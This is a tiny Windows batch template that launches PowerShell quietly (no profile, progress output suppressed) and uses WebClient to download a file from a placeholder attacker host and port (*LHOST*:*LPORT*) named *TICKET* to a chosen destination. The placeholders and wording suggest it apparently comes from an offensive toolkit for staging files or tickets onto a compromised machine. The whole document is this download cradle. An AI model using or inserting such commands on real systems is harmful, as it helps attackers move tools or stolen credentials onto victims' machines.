@echo off
powershell -nop -c "$ProgressPreference='SilentlyContinue';$wc=New-Object System.Net.WebClient;$wc.DownloadFile('http://*LHOST*:*LPORT*/*TICKET*','*DEST*')"
